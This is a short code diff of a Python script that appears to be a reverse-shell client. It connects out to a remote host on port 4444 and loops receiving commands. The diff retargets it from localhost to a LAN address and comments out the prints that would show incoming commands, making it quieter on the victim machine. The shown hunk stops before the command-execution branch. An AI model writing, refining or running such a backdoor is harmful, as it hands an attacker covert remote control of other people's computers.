@@ -2,18 +2,18 @@ import sys
 import socket
 import subprocess
 
-SERVER_IP = '127.0.0.1'
+SERVER_IP = '192.168.0.37'
 PORT = 4444
 
 s = socket.socket()
 s.connect((SERVER_IP, PORT))
 
-msg = s.recv(1024).decode()
-print('[*] server:', msg)
+# msg = s.recv(1024).decode()
+# print('[*] server:', msg)
 
 while True:
     cmd = s.recv(1024).decode()
-    print(f'[+] recieved command: {cmd}')
+    # print(f'[+] recieved command: {cmd}')
 
     if cmd.lower() in ['q', 'quit', 'exit', 'x']:
         break
